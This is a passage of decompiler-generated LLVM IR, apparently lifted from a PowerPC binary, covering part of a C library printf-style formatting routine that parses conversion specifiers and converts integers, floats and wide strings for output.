dec_label_pc_100086d4:                            ; preds = %dec_label_pc_100086c8
  %v3_100086d4 = icmp eq i8 %v2_100086c8, 37
  br i1 %v3_100086d4, label %dec_label_pc_100086dc, label %dec_label_pc_100086c8.backedge

dec_label_pc_100086dc:                            ; preds = %dec_label_pc_100086d4, %dec_label_pc_100086c8
  %v4_100086dc = icmp eq i32 %v1_100086e4, %v0_100086f4
  br i1 %v4_100086dc, label %dec_label_pc_10008710, label %dec_label_pc_100086e4

dec_label_pc_100086e4:                            ; preds = %dec_label_pc_100086dc
  %v2_100086e4 = sub i32 %v1_100086e4, %v0_100086f4
  store i32 %v2_100086e4, i32* @r31, align 4
  %v4_100086e4 = icmp sgt i32 %v2_100086e4, 0
  br i1 %v4_100086e4, label %dec_label_pc_100086f4, label %dec_label_pc_10008704

dec_label_pc_100086f4:                            ; preds = %dec_label_pc_100086e4
  %v0_100086fc = load i32, i32* %r24.global-to-local, align 4
  store i32 268470020, i32* @lr, align 4
  %v3_10008700 = inttoptr i32 %v0_100086fc to i16*
  %v4_10008700 = call i32 @__stdio_fwrite(i32 %v0_100086f4, i32 %v2_100086e4, i16* %v3_10008700)
  %v1_10008704.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10008704

dec_label_pc_10008704:                            ; preds = %dec_label_pc_100086e4, %dec_label_pc_100086f4
  %v1_1000870c = phi i32 [ %v1_10008704.pre, %dec_label_pc_100086f4 ], [ %v2_100086e4, %dec_label_pc_100086e4 ]
  %storemerge2 = phi i32 [ %v4_10008700, %dec_label_pc_100086f4 ], [ 0, %dec_label_pc_100086e4 ]
  %v4_10008704 = icmp eq i32 %storemerge2, %v1_1000870c
  br i1 %v4_10008704, label %dec_label_pc_1000870c, label %dec_label_pc_10008cac

dec_label_pc_1000870c:                            ; preds = %dec_label_pc_10008704
  %v0_1000870c = load i32, i32* %r23.global-to-local, align 4
  %v2_1000870c = add i32 %v0_1000870c, %v1_1000870c
  store i32 %v2_1000870c, i32* %r23.global-to-local, align 4
  %v0_10008710.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10008710

dec_label_pc_10008710:                            ; preds = %dec_label_pc_100086dc, %dec_label_pc_1000870c
  %v0_1000871c = phi i32 [ %v0_100086f4, %dec_label_pc_100086dc ], [ %v0_10008710.pre, %dec_label_pc_1000870c ]
  %v1_10008710 = inttoptr i32 %v0_1000871c to i8*
  %v2_10008710 = load i8, i8* %v1_10008710, align 1
  %v3_10008710 = zext i8 %v2_10008710 to i32
  store i32 %v3_10008710, i32* %r0.global-to-local, align 4
  %v3_10008714 = icmp eq i8 %v2_10008710, 0
  br i1 %v3_10008714, label %dec_label_pc_10008cb0, label %dec_label_pc_1000871c

dec_label_pc_1000871c:                            ; preds = %dec_label_pc_10008710
  %v1_1000871c = add i32 %v0_1000871c, 1
  %v2_1000871c = inttoptr i32 %v1_1000871c to i8*
  %v3_1000871c = load i8, i8* %v2_1000871c, align 1
  %v4_1000871c = zext i8 %v3_1000871c to i32
  store i32 %v4_1000871c, i32* %r0.global-to-local, align 4
  %v3_10008724 = icmp eq i8 %v3_1000871c, 37
  br i1 %v3_10008724, label %dec_label_pc_100086c8.backedge, label %dec_label_pc_1000872c

dec_label_pc_1000872c:                            ; preds = %dec_label_pc_1000871c
  store i32 %v2_10008664, i32* @r29, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i8* %v2_1000871c, i8** %stack_var_-200, align 4
  store i32 268470084, i32* @lr, align 4
  %v3_10008740 = call i32 @_ppfs_parsespec(i32* %v1_1000867c, i32 %v1_1000871c)
  store i32 %v2_10008664, i32* @r3, align 4
  store i32 268470092, i32* @lr, align 4
  %v0_10008748 = call i32 @_ppfs_setargs()
  store i32 %v4_10008750, i32* @r7, align 4
  store i32 %v2_10008758, i32* %r0.global-to-local, align 4
  br i1 %v2_10008754, label %dec_label_pc_10008768, label %dec_label_pc_10008774

dec_label_pc_10008768:                            ; preds = %dec_label_pc_1000872c
  br label %dec_label_pc_10008774

dec_label_pc_10008774:                            ; preds = %dec_label_pc_1000872c, %dec_label_pc_10008768
  %v0_100087a082 = phi i32 [ %v1_10008770, %dec_label_pc_10008768 ], [ %v2_10008758, %dec_label_pc_1000872c ]
  store i32 %v0_100087a082, i32* %r10.global-to-local, align 4
  store i32 %v2_1000877c, i32* @r8, align 4
  store i32 %v1_10008784, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  br i1 %tmp73, label %dec_label_pc_100087a4.preheader, label %dec_label_pc_100087a4.preheader.thread

dec_label_pc_100087a4.preheader.thread:           ; preds = %dec_label_pc_10008774
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100087b0

dec_label_pc_100087a4.preheader:                  ; preds = %dec_label_pc_10008774
  store i32 %tmp58, i32* %ctr.global-to-local, align 4
  br i1 %v3_10008780, label %dec_label_pc_100087b0, label %dec_label_pc_1000879c.preheader

dec_label_pc_1000879c.preheader:                  ; preds = %dec_label_pc_100087a4.preheader
  store i32 %v0_100087a082, i32* %stack_var_-344, align 4
  %v1_100087a083 = add i32 %v0_100087a082, 8
  store i32 %v1_100087a083, i32* %r10.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r11.global-to-local, align 4
  %v1_100087ac88 = add i32 %tmp58, -1
  store i32 %v1_100087ac88, i32* %ctr.global-to-local, align 4
  %v2_100087ac89 = icmp eq i32 %v1_100087ac88, 0
  br i1 %v2_100087ac89, label %dec_label_pc_100087b0, label %dec_label_pc_1000879c.dec_label_pc_1000879c_crit_edge

dec_label_pc_1000879c.dec_label_pc_1000879c_crit_edge: ; preds = %dec_label_pc_1000879c.preheader, %dec_label_pc_1000879c.dec_label_pc_1000879c_crit_edge.dec_label_pc_1000879c.dec_label_pc_1000879c_crit_edge_crit_edge
  %v1_1000879c.pre = phi i32 [ %v1_1000879c.pre.pre, %dec_label_pc_1000879c.dec_label_pc_1000879c_crit_edge.dec_label_pc_1000879c.dec_label_pc_1000879c_crit_edge_crit_edge ], [ %v2_1000877c, %dec_label_pc_1000879c.preheader ]
  %v1_100087a491 = phi i32 [ %v1_100087a4, %dec_label_pc_1000879c.dec_label_pc_1000879c_crit_edge.dec_label_pc_1000879c.dec_label_pc_1000879c_crit_edge_crit_edge ], [ 4, %dec_label_pc_1000879c.preheader ]
  %v1_100087a090 = phi i32 [ %v1_100087a0, %dec_label_pc_1000879c.dec_label_pc_1000879c_crit_edge.dec_label_pc_1000879c.dec_label_pc_1000879c_crit_edge_crit_edge ], [ %v1_100087a083, %dec_label_pc_1000879c.preheader ]
  %v3_1000879c = add i32 %v1_1000879c.pre, %v1_100087a491
  %v4_1000879c = inttoptr i32 %v3_1000879c to i32*
  store i32 %v1_100087a090, i32* %v4_1000879c, align 4
  %v0_100087a0 = load i32, i32* %r10.global-to-local, align 4
  %v1_100087a0 = add i32 %v0_100087a0, 8
  store i32 %v1_100087a0, i32* %r10.global-to-local, align 4
  %v0_100087a4 = load i32, i32* %r11.global-to-local, align 4
  %v1_100087a4 = mul i32 %v0_100087a4, 4
  store i32 %v1_100087a4, i32* %r0.global-to-local, align 4
  %v1_100087a8 = add i32 %v0_100087a4, 1
  store i32 %v1_100087a8, i32* %r11.global-to-local, align 4
  %v0_100087ac = load i32, i32* %ctr.global-to-local, align 4
  %v1_100087ac = add i32 %v0_100087ac, -1
  store i32 %v1_100087ac, i32* %ctr.global-to-local, align 4
  %v2_100087ac = icmp eq i32 %v1_100087ac, 0
  br i1 %v2_100087ac, label %dec_label_pc_100087b0, label %dec_label_pc_1000879c.dec_label_pc_1000879c_crit_edge.dec_label_pc_1000879c.dec_label_pc_1000879c_crit_edge_crit_edge

dec_label_pc_1000879c.dec_label_pc_1000879c_crit_edge.dec_label_pc_1000879c.dec_label_pc_1000879c_crit_edge_crit_edge: ; preds = %dec_label_pc_1000879c.dec_label_pc_1000879c_crit_edge
  %v1_1000879c.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1000879c.dec_label_pc_1000879c_crit_edge

dec_label_pc_100087b0:                            ; preds = %dec_label_pc_1000879c.preheader, %dec_label_pc_1000879c.dec_label_pc_1000879c_crit_edge, %dec_label_pc_100087a4.preheader.thread, %dec_label_pc_100087a4.preheader
  store i32 %tmp57, i32* %r11.global-to-local, align 4
  br i1 %v3_100087b4, label %dec_label_pc_100087bc, label %dec_label_pc_100087dc

dec_label_pc_100087bc:                            ; preds = %dec_label_pc_100087b0
  %v0_100087c0 = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_100087c0, i32* @r6, align 4
  %tmp96 = icmp slt i32 %v0_100087c0, 0
  %v1_100087c8 = zext i1 %tmp96 to i32
  %v2_100087c8 = ashr i32 %v0_100087c0, 31
  %v3_100087c8 = and i32 %v2_100087c8, -2
  %v4_100087c8 = or i32 %v3_100087c8, %v1_100087c8
  store i32 %v4_100087c8, i32* @r5, align 4
  %v1_100087d0 = call i32 @__asm_rlwinm(i32 %v0_100088f0, i32 0, i32 20, i32 23)
  store i32 %v1_100087d0, i32* @r4, align 4
  %v1_100087d4 = inttoptr i32 %v1_100087d0 to i16*
  %v2_100087d4 = call i32 @_store_inttype(i16* %v1_100087d4)
  br label %dec_label_pc_10008c98

dec_label_pc_100087dc:                            ; preds = %dec_label_pc_100087b0
  br i1 %v2_100087dc, label %dec_label_pc_100089bc, label %dec_label_pc_100087e4

dec_label_pc_100087e4:                            ; preds = %dec_label_pc_100087dc
  store i32 87, i32* %r31.global-to-local, align 4
  %v3_100087f4 = load i8, i8* %v2_100087f4, align 1
  %v4_100087f4 = zext i8 %v3_100087f4 to i32
  store i32 %v4_100087f4, i32* %r30.global-to-local, align 4
  %v3_100087f8 = icmp eq i8 %v3_100087f4, 10
  br i1 %v3_100087f8, label %dec_label_pc_10008800, label %dec_label_pc_10008828

dec_label_pc_10008800:                            ; preds = %dec_label_pc_100087e4
  store i32 %v0_100088f0, i32* %r0.global-to-local, align 4
  %v1_10008804 = call i32 @__asm_rlwinm(i32 %v0_100088f0, i32 26, i32 31, i32 31)
  %v1_10008808 = call i32 @__asm_rlwinm(i32 %v0_100088f0, i32 27, i32 31, i32 31)
  %v3_1000880c = icmp eq i32 %v1_10008804, 0
  %v2_10008810 = icmp ne i32 %v1_10008808, 0
  %not.v2_10008810 = xor i1 %v2_10008810, true
  %v6_10008814 = sext i1 %not.v2_10008810 to i32
  store i32 %v6_10008814, i32* %r0.global-to-local, align 4
  %v1_1000881c = select i1 %v2_10008810, i32 44, i32 87
  store i32 %v1_1000881c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000880c, label %dec_label_pc_10008828, label %dec_label_pc_10008824

dec_label_pc_10008824:                            ; preds = %dec_label_pc_10008800
  %v1_10008824 = or i32 %v1_1000881c, 128
  store i32 %v1_10008824, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008828

dec_label_pc_10008828:                            ; preds = %dec_label_pc_100087e4, %dec_label_pc_10008800, %dec_label_pc_10008824
  %v0_10008828 = load i32, i32* %r11.global-to-local, align 4
  %v2_10008828 = icmp ugt i32 %v0_10008828, 5
  br i1 %v2_10008828, label %dec_label_pc_10008850, label %dec_label_pc_10008830

dec_label_pc_10008830:                            ; preds = %dec_label_pc_10008828
  %v3_10008830 = icmp eq i32 %v0_10008828, 3
  br i1 %v3_10008830, label %dec_label_pc_10008838, label %dec_label_pc_10008840

dec_label_pc_10008838:                            ; preds = %dec_label_pc_10008830
  store i32 55, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008854

dec_label_pc_10008840:                            ; preds = %dec_label_pc_10008830
  %v3_10008840 = icmp eq i32 %v0_10008828, 1
  br i1 %v3_10008840, label %dec_label_pc_10008858, label %dec_label_pc_10008854

dec_label_pc_10008850:                            ; preds = %dec_label_pc_10008828
  %v0_10008850 = load i32, i32* %r30.global-to-local, align 4
  %v1_10008850 = sub i32 0, %v0_10008850
  store i32 %v1_10008850, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008854

dec_label_pc_10008854:                            ; preds = %dec_label_pc_10008840, %dec_label_pc_10008838, %dec_label_pc_10008850
  br label %dec_label_pc_10008858

dec_label_pc_10008858:                            ; preds = %dec_label_pc_10008840, %dec_label_pc_10008854
  %storemerge3 = phi i32 [ 11, %dec_label_pc_10008854 ], [ 6, %dec_label_pc_10008840 ]
  store i32 %storemerge3, i32* @r27, align 4
  %v3_10008858 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_10008858, i32* %r0.global-to-local, align 4
  %tmp75 = icmp sgt i32 %v3_10008858, -1
  br i1 %tmp75, label %dec_label_pc_1000886c, label %dec_label_pc_10008868

dec_label_pc_10008868:                            ; preds = %dec_label_pc_10008858
  br label %dec_label_pc_1000886c

dec_label_pc_1000886c:                            ; preds = %dec_label_pc_10008858, %dec_label_pc_10008868
  %storemerge = phi i32 [ %v4_10008868, %dec_label_pc_10008868 ], [ 32, %dec_label_pc_10008858 ]
  store i32 %storemerge, i32* @r26, align 4
  %v3_1000886c = icmp eq i32 %v0_10008828, 1
  br i1 %v3_1000886c, label %dec_label_pc_10008888, label %dec_label_pc_10008878

dec_label_pc_10008878:                            ; preds = %dec_label_pc_1000886c
  %v0_10008878 = load i32, i32* @r7, align 4
  %v1_10008878 = mul i32 %v0_10008878, 4
  store i32 %v1_10008878, i32* %r0.global-to-local, align 4
  %v0_1000887c = load i32, i32* @r1, align 4
  %v2_1000887c = add i32 %v0_1000887c, %v1_10008878
  %v1_10008880 = add i32 %v2_1000887c, 188
  %v2_10008880 = inttoptr i32 %v1_10008880 to i32*
  %v3_10008880 = load i32, i32* %v2_10008880, align 4
  store i32 %v3_10008880, i32* %r0.global-to-local, align 4
  %v1_10008884 = call i32 @__asm_rlwinm(i32 %v3_10008880, i32 0, i32 20, i32 23)
  br label %dec_label_pc_10008888

dec_label_pc_10008888:                            ; preds = %dec_label_pc_1000886c, %dec_label_pc_10008878
  %v3_10008888 = load i32, i32* %stack_var_-344, align 4
  %v0_1000888c = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000888c, i32* @r5, align 4
  %v2_10008890 = inttoptr i32 %v0_1000888c to i32*
  %v3_10008890 = call i32 @_load_inttype(i32 %v3_10008888, i32* %v2_10008890)
  %v0_100088a0 = load i32, i32* %r31.global-to-local, align 4
  %v6_100088a8 = call i32 @_uintmaxtostr(i8* %v5_100088a8, i32 %v3_10008890, i32 %v3_10008888, i32 %v0_1000888c, i32 %v0_100088a0)
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  store i32 %v6_100088a8, i32* %r30.global-to-local, align 4
  br i1 %tmp74, label %dec_label_pc_100088fc, label %dec_label_pc_100088bc

dec_label_pc_100088bc:                            ; preds = %dec_label_pc_10008888
  %v7_100088a8 = inttoptr i32 %v6_100088a8 to i8*
  %v3_100088bc = load i8, i8* %v7_100088a8, align 1
  %v4_100088bc = zext i8 %v3_100088bc to i32
  store i32 %v4_100088bc, i32* %r0.global-to-local, align 4
  %v3_100088c4 = icmp eq i8 %v3_100088bc, 45
  br i1 %v3_100088c4, label %dec_label_pc_100088cc, label %dec_label_pc_100088e0

dec_label_pc_100088cc:                            ; preds = %dec_label_pc_100088bc
  %v1_100088cc = or i32 %v0_100088f0, 2
  store i32 %v1_100088cc, i32* %r0.global-to-local, align 4
  %v2_100088d0 = add i32 %v6_100088a8, 1
  store i32 %v2_100088d0, i32* %r30.global-to-local, align 4
  store i32 2, i32* @r27, align 4
  br label %dec_label_pc_100088fc

dec_label_pc_100088e0:                            ; preds = %dec_label_pc_100088bc
  %v1_100088e0 = and i32 %v0_100088f0, 2
  store i32 %v1_100088e0, i32* %r0.global-to-local, align 4
  %v3_100088e0 = icmp eq i32 %v1_100088e0, 0
  br i1 %v3_100088e0, label %dec_label_pc_100088f0, label %dec_label_pc_100088e8

dec_label_pc_100088e8:                            ; preds = %dec_label_pc_100088e0
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_100088fc

dec_label_pc_100088f0:                            ; preds = %dec_label_pc_100088e0
  %v1_100088f0 = urem i32 %v0_100088f0, 2
  store i32 %v1_100088f0, i32* %r11.global-to-local, align 4
  %v3_100088f0 = icmp eq i32 %v1_100088f0, 0
  br i1 %v3_100088f0, label %dec_label_pc_100088fc, label %dec_label_pc_100088f8

dec_label_pc_100088f8:                            ; preds = %dec_label_pc_100088f0
  store i32 4, i32* @r27, align 4
  br label %dec_label_pc_100088fc

dec_label_pc_100088fc:                            ; preds = %dec_label_pc_100088f0, %dec_label_pc_10008888, %dec_label_pc_100088e8, %dec_label_pc_100088cc, %dec_label_pc_100088f8
  %v0_10008968 = phi i32 [ %v6_100088a8, %dec_label_pc_10008888 ], [ %v2_100088d0, %dec_label_pc_100088cc ], [ %v6_100088a8, %dec_label_pc_100088f0 ], [ %v6_100088a8, %dec_label_pc_100088f8 ], [ %v6_100088a8, %dec_label_pc_100088e8 ]
  %stack_var_-184.0 = phi i32 [ %v0_100088f0, %dec_label_pc_10008888 ], [ %v1_100088cc, %dec_label_pc_100088cc ], [ %v0_100088f0, %dec_label_pc_100088f0 ], [ %v0_100088f0, %dec_label_pc_100088f8 ], [ %v0_100088f0, %dec_label_pc_100088e8 ]
  %v3_100088fc = load i32, i32* %stack_var_-196, align 4
  store i32 %v2_10008b10, i32* %r0.global-to-local, align 4
  %v2_10008904 = sub i32 %v2_10008b10, %v0_10008968
  %v1_1000890c = add i32 %v2_10008904, 127
  store i32 %v1_1000890c, i32* %r31.global-to-local, align 4
  %tmp76 = icmp sgt i32 %v3_100088fc, -1
  br i1 %tmp76, label %dec_label_pc_10008918, label %dec_label_pc_10008914

dec_label_pc_10008914:                            ; preds = %dec_label_pc_100088fc
  br label %dec_label_pc_10008918

dec_label_pc_10008918:                            ; preds = %dec_label_pc_100088fc, %dec_label_pc_10008914
  %v0_1000894c = phi i32 [ %v3_100088fc, %dec_label_pc_100088fc ], [ 1, %dec_label_pc_10008914 ]
  store i32 %stack_var_-184.0, i32* %r0.global-to-local, align 4
  %v1_1000891c = and i32 %stack_var_-184.0, 16
  store i32 %v1_1000891c, i32* %r11.global-to-local, align 4
  %v3_1000891c = icmp eq i32 %v1_1000891c, 0
  br i1 %v3_1000891c, label %dec_label_pc_10008968, label %dec_label_pc_10008924

dec_label_pc_10008924:                            ; preds = %dec_label_pc_10008918
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v2_10008928, label %dec_label_pc_10008934, label %dec_label_pc_10008944.thread

dec_label_pc_10008944.thread:                     ; preds = %dec_label_pc_10008924
  store i32 6, i32* @r27, align 4
  br label %dec_label_pc_10008968

dec_label_pc_10008934:                            ; preds = %dec_label_pc_10008924
  br i1 %v3_10008934, label %dec_label_pc_1000893c, label %dec_label_pc_10008944

dec_label_pc_1000893c:                            ; preds = %dec_label_pc_10008934
  store i32 9, i32* @r27, align 4
  br label %dec_label_pc_10008968

dec_label_pc_10008944:                            ; preds = %dec_label_pc_10008934
  br i1 %v3_10008944, label %dec_label_pc_1000894c, label %dec_label_pc_10008968

dec_label_pc_1000894c:                            ; preds = %dec_label_pc_10008944
  %v3_1000894c = icmp ugt i32 %v0_1000894c, %v1_1000890c
  br i1 %v3_1000894c, label %dec_label_pc_10008968, label %dec_label_pc_10008954

dec_label_pc_10008954:                            ; preds = %dec_label_pc_1000894c
  %v1_10008954 = inttoptr i32 %v0_10008968 to i8*
  %v2_10008954 = load i8, i8* %v1_10008954, align 1
  %v3_10008954 = zext i8 %v2_10008954 to i32
  store i32 %v3_10008954, i32* %r0.global-to-local, align 4
  %v3_1000895c = icmp eq i8 %v2_10008954, 48
  br i1 %v3_1000895c, label %dec_label_pc_10008968, label %dec_label_pc_10008964

dec_label_pc_10008964:                            ; preds = %dec_label_pc_10008954
  %v1_10008964 = add i32 %v2_10008904, 128
  br label %dec_label_pc_10008968

dec_label_pc_10008968:                            ; preds = %dec_label_pc_10008944.thread, %dec_label_pc_10008944, %dec_label_pc_10008954, %dec_label_pc_1000894c, %dec_label_pc_10008918, %dec_label_pc_1000893c, %dec_label_pc_10008964
  %v1_100089b0 = phi i32 [ %v0_1000894c, %dec_label_pc_10008944 ], [ 1, %dec_label_pc_10008954 ], [ %v0_1000894c, %dec_label_pc_1000894c ], [ %v0_1000894c, %dec_label_pc_10008918 ], [ %v0_1000894c, %dec_label_pc_1000893c ], [ %v1_10008964, %dec_label_pc_10008964 ], [ %v0_1000894c, %dec_label_pc_10008944.thread ]
  %v1_10008968 = inttoptr i32 %v0_10008968 to i8*
  %v2_10008968 = load i8, i8* %v1_10008968, align 1
  %v3_10008968 = zext i8 %v2_10008968 to i32
  store i32 %v3_10008968, i32* %r0.global-to-local, align 4
  %v3_1000896c = icmp eq i8 %v2_10008968, 48
  br i1 %v3_1000896c, label %dec_label_pc_10008974, label %dec_label_pc_100089ac

dec_label_pc_10008974:                            ; preds = %dec_label_pc_10008968
  %v0_10008974 = load i32, i32* @r27, align 4
  %tmp77 = icmp slt i32 %v0_10008974, 6
  br i1 %tmp77, label %dec_label_pc_10008980, label %dec_label_pc_1000897c

dec_label_pc_1000897c:                            ; preds = %dec_label_pc_10008974
  store i32 11, i32* @r27, align 4
  br label %dec_label_pc_10008980

dec_label_pc_10008980:                            ; preds = %dec_label_pc_10008974, %dec_label_pc_1000897c
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v3_10008984, label %dec_label_pc_1000898c, label %dec_label_pc_1000899c

dec_label_pc_1000898c:                            ; preds = %dec_label_pc_10008980
  store i32 5, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_10011b28.295 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008b28

dec_label_pc_1000899c:                            ; preds = %dec_label_pc_10008980
  %v3_1000899c = icmp eq i32 %v1_100089b0, 0
  br i1 %v3_1000899c, label %dec_label_pc_100089a4, label %dec_label_pc_100089ac

dec_label_pc_100089a4:                            ; preds = %dec_label_pc_1000899c
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008b28

dec_label_pc_100089ac:                            ; preds = %dec_label_pc_1000899c, %dec_label_pc_10008968
  %v3_100089ac = icmp ugt i32 %v1_100089b0, %v1_1000890c
  %v2_100089b0 = sub i32 %v1_100089b0, %v1_1000890c
  store i32 %v2_100089b0, i32* %r29.global-to-local, align 4
  br i1 %v3_100089ac, label %dec_label_pc_10008b48thread-pre-split, label %dec_label_pc_10008b28

dec_label_pc_100089bc:                            ; preds = %dec_label_pc_100087dc
  br i1 %v2_100089bc, label %dec_label_pc_100089f0, label %dec_label_pc_100089c4

dec_label_pc_100089c4:                            ; preds = %dec_label_pc_100089bc
  %v3_100089c4 = load i32, i32* %stack_var_-344, align 4
  %v0_100089d0 = load i32, i32* %r24.global-to-local, align 4
  store i32 268470752, i32* @lr, align 4
  %v5_100089dc = call i32 @_fpmaxtostr(i32 %v0_100089d0, i32* nonnull %stack_var_-196, i32 add (i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32), i32 -31304), i32 %v3_100089c4)
  %v1_100089e0 = icmp slt i32 %v5_100089dc, 0
  br i1 %v1_100089e0, label %dec_label_pc_10008cac, label %dec_label_pc_100089e8

dec_label_pc_100089e8:                            ; preds = %dec_label_pc_100089c4
  %v0_100089e8 = load i32, i32* %r23.global-to-local, align 4
  %v2_100089e8 = add i32 %v0_100089e8, %v5_100089dc
  store i32 %v2_100089e8, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_10008c98

dec_label_pc_100089f0:                            ; preds = %dec_label_pc_100089bc
  br i1 %v2_100089f0, label %dec_label_pc_10008a98, label %dec_label_pc_100089f8

dec_label_pc_100089f8:                            ; preds = %dec_label_pc_100089f0
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v3_10008a04 = load i32, i32* %stack_var_-344, align 4
  %v1_10008a0c = inttoptr i32 %v3_10008a04 to i32*
  %v2_10008a0c = load i32, i32* %v1_10008a0c, align 4
  br i1 %v3_100089f0, label %dec_label_pc_10008a0c, label %dec_label_pc_10008a60

dec_label_pc_10008a0c:                            ; preds = %dec_label_pc_100089f8
  store i32 %v2_10008a0c, i32* %r0.global-to-local, align 4
  %v3_10008a10 = icmp eq i32 %v2_10008a0c, 0
  store i32 %v2_10008a0c, i32* %stack_var_-340, align 4
  br i1 %v3_10008a10, label %dec_label_pc_10008b30, label %dec_label_pc_10008a1c

dec_label_pc_10008a1c:                            ; preds = %dec_label_pc_10008a0c
  %v3_10008a1c = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_10008a1c, i32* %r0.global-to-local, align 4
  %v1_10008a24 = icmp slt i32 %v3_10008a1c, 0
  br i1 %v1_10008a24, label %dec_label_pc_10008a30, label %dec_label_pc_10008a2c

dec_label_pc_10008a2c:                            ; preds = %dec_label_pc_10008a1c
  br label %dec_label_pc_10008a30

dec_label_pc_10008a30:                            ; preds = %dec_label_pc_10008a1c, %dec_label_pc_10008a2c
  %storemerge94 = phi i32 [ %v3_10008a1c, %dec_label_pc_10008a2c ], [ -1, %dec_label_pc_10008a1c ]
  store i32 %storemerge94, i32* @r5, align 4
  store i32 %v2_10008a30, i32* @r3, align 4
  store i32 %v2_10008a34, i32* @r6, align 4
  store i32 %v2_10008a30, i32* @r4, align 4
  store i32 268470848, i32* @lr, align 4
  %v0_10008a3c = call i32 @__GI_wcsrtombs()
  %v3_10008a40 = icmp eq i32 %v0_10008a3c, -1
  store i32 %v0_10008a3c, i32* @r31, align 4
  br i1 %v3_10008a40, label %dec_label_pc_10008cac, label %dec_label_pc_10008a4c

dec_label_pc_10008a4c:                            ; preds = %dec_label_pc_10008a30
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008b48

dec_label_pc_10008a60:                            ; preds = %dec_label_pc_100089f8
  store i32 %v2_10008b10, i32* @r28, align 4
  store i32 268470900, i32* @lr, align 4
  %v3_10008a70 = call i32 @__GI_wcrtomb(i32 %v2_10008b10, i32 %v2_10008a0c, i32 %v2_10008a34)
  %v3_10008a74 = icmp eq i32 %v3_10008a70, -1
  store i32 %v3_10008a70, i32* @r31, align 4
  br i1 %v3_10008a74, label %dec_label_pc_10008cac, label %dec_label_pc_10008a80

dec_label_pc_10008a80:                            ; preds = %dec_label_pc_10008a60
  store i32 %v2_10008b10, i32* %r30.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  %v0_10008a90 = load i32, i32* @r25, align 4
  %v1_10008a90 = load i32, i32* @r28, align 4
  %v3_10008a90 = trunc i32 %v0_10008a90 to i8
  %v4_10008a90 = add i32 %v1_10008a90, %v3_10008a70
  %v5_10008a90 = inttoptr i32 %v4_10008a90 to i8*
  store i8 %v3_10008a90, i8* %v5_10008a90, align 1
  %v0_10008b4c.pre.pre = load i32, i32* @r31, align 4
  %v1_10008b4c.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10008b48thread-pre-split

dec_label_pc_10008a98:                            ; preds = %dec_label_pc_100089f0
  br i1 %v2_10008a98, label %dec_label_pc_10008b04, label %dec_label_pc_10008aa0

dec_label_pc_10008aa0:                            ; preds = %dec_label_pc_10008a98
  %v3_10008aa4 = load i32, i32* %stack_var_-344, align 4
  %v1_10008aac = inttoptr i32 %v3_10008aa4 to i32*
  %v2_10008aac = load i32, i32* %v1_10008aac, align 4
  br i1 %v3_10008a98, label %dec_label_pc_10008aac, label %dec_label_pc_10008adc

dec_label_pc_10008aac:                            ; preds = %dec_label_pc_10008aa0
  store i32 %v2_10008aac, i32* %r30.global-to-local, align 4
  %v3_10008ab0 = icmp eq i32 %v2_10008aac, 0
  br i1 %v3_10008ab0, label %dec_label_pc_10008b30, label %dec_label_pc_10008ab8

dec_label_pc_10008ab8:                            ; preds = %dec_label_pc_10008aac, %dec_label_pc_10008b0c
  %v0_10008acc = phi i32 [ %v2_10008aac, %dec_label_pc_10008aac ], [ %v3_10008b1c, %dec_label_pc_10008b0c ]
  %v3_10008ab8 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_10008ab8, i32* %r0.global-to-local, align 4
  %v1_10008ac0 = icmp slt i32 %v3_10008ab8, 0
  br i1 %v1_10008ac0, label %dec_label_pc_10008acc, label %dec_label_pc_10008ac8

dec_label_pc_10008ac8:                            ; preds = %dec_label_pc_10008ab8
  br label %dec_label_pc_10008acc

dec_label_pc_10008acc:                            ; preds = %dec_label_pc_10008ab8, %dec_label_pc_10008ac8
  %storemerge95 = phi i32 [ %v3_10008ab8, %dec_label_pc_10008ac8 ], [ -1, %dec_label_pc_10008ab8 ]
  store i32 %storemerge95, i32* @r4, align 4
  store i32 268470996, i32* @lr, align 4
  %v1_10008ad0 = inttoptr i32 %v0_10008acc to i8*
  %v2_10008ad0 = call i32 @strnlen(i8* %v1_10008ad0)
  store i32 %v2_10008ad0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008b3c

dec_label_pc_10008adc:                            ; preds = %dec_label_pc_10008aa0
  store i32 1, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 %v2_10008aac, i32* %stack_var_-328, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v2_10008b10, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008b48thread-pre-split

